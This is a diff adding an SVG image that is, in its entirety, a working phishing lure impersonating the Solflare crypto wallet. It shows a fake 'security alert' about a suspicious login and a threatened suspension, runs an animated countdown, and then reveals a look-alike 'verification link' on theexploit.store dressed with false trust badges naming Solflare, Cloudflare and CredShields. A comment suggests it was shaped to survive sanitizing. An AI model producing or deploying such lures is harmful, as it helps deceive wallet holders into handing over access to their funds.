@@ -1,0 +1,70 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<svg width="560" height="360" xmlns="http://www.w3.org/2000/svg">
+  <style>
+    .bg { fill: #0d0f1a; }
+    .card { fill: #141626; }
+    .bdr { stroke: #ff6b35; stroke-width: 1.5; fill: none; }
+    .title { fill: #ffffff; font-family: sans-serif; font-size: 19px; font-weight: bold; }
+    .sub { fill: #8892b0; font-family: sans-serif; font-size: 13px; }
+    .warn { fill: #ff6b35; font-family: sans-serif; font-size: 28px; }
+    .btn { fill: #ff6b35; cursor: pointer; }
+    .btn-t { fill: white; font-family: sans-serif; font-size: 13px; font-weight: bold; cursor: pointer; }
+    .domain { fill: #64ffda; font-family: monospace; font-size: 10px; }
+    .hide { display: none; }
+    .show { display: inline; }
+    .url-box { fill: #0a1628; stroke: #4fc3f7; stroke-width: 1.5; }
+    .url-t { fill: #4fc3f7; font-family: monospace; font-size: 16px; font-weight: bold; }
+    .url-lbl { fill: #8892b0; font-family: sans-serif; font-size: 12px; }
+    .trust { fill: #64ffda; font-family: sans-serif; font-size: 11px; }
+    .cta { fill: #a8b2d8; font-family: sans-serif; font-size: 12px; }
+    .kbd { fill: #ff6b35; font-family: monospace; font-size: 11px; }
+    .timer { fill: #ff6b35; font-family: monospace; font-size: 22px; font-weight: bold; }
+  </style>
+
+  <rect class="bg" width="560" height="360"/>
+  <rect class="card" x="18" y="18" width="524" height="324" rx="10"/>
+  <rect class="bdr" x="18" y="18" width="524" height="324" rx="10"/>
+
+  <!-- PANEL 1: Alert (initially shown, auto-hides at 5s OR on click OR on V key) -->
+  <g id="p1" class="show">
+    <set attributeName="class" begin="5s" to="hide" fill="freeze"/>
+    <set attributeName="class" begin="revbtn.click" to="hide" fill="freeze"/>
+    <set attributeName="class" begin="accessKey(v)" to="hide" fill="freeze"/>
+
+    <text class="warn" x="280" y="80" text-anchor="middle">⚠</text>
+    <text class="title" x="280" y="118" text-anchor="middle">Solflare Security Alert</text>
+    <text class="sub" x="280" y="148" text-anchor="middle">Suspicious login attempt detected on your wallet.</text>
+    <text class="sub" x="280" y="168" text-anchor="middle">Verification required to prevent account suspension.</text>
+
+    <!-- Countdown display: animates from "5" to showing the button -->
+    <!-- Timer labels that appear/disappear via SMIL -->
+    <text class="timer" x="280" y="220" text-anchor="middle" id="countdown">5</text>
+    <set href="#countdown" attributeName="display" begin="1s" to="inline" fill="freeze"/>
+    <!-- Note: href stripped, so these target parent - but we use separate elements -->
+
+    <g id="revbtn" cursor="pointer">
+      <rect class="btn" x="170" y="245" width="220" height="44" rx="8"/>
+      <text class="btn-t" x="280" y="272" text-anchor="middle">Verify Wallet Now →</text>
+    </g>
+    <text class="kbd" x="280" y="310" text-anchor="middle">or press [V] • auto-redirects in 5s</text>
+    <text class="domain" x="280" y="328" text-anchor="middle">security.www.solflare.com</text>
+  </g>
+
+  <!-- PANEL 2: URL Reveal (initially hidden, shows at 5s OR on click OR on V key) -->
+  <g id="p2" class="hide">
+    <set attributeName="class" begin="5s" to="show" fill="freeze"/>
+    <set attributeName="class" begin="revbtn.click" to="show" fill="freeze"/>
+    <set attributeName="class" begin="accessKey(v)" to="show" fill="freeze"/>
+
+    <text class="title" x="280" y="90" text-anchor="middle">Secure Verification Portal</text>
+    <text class="url-lbl" x="280" y="125" text-anchor="middle">Your one-time verification link:</text>
+
+    <rect class="url-box" x="50" y="140" width="460" height="55" rx="8"/>
+    <text class="url-t" x="280" y="175" text-anchor="middle">theexploit.store/solflare/verify</text>
+
+    <text class="cta" x="280" y="225" text-anchor="middle">Copy and paste this URL into your browser to verify.</text>
+    <text class="cta" x="280" y="248" text-anchor="middle">This link expires in 15 minutes.</text>
+    <text class="trust" x="280" y="285" text-anchor="middle">🔒 Secure session · www.solflare.com · Powered by Cloudflare</text>
+    <text class="domain" x="280" y="315" text-anchor="middle">Verified by CredShields Security · Reference: SF-2026-ALERT</text>
+  </g>
+</svg>
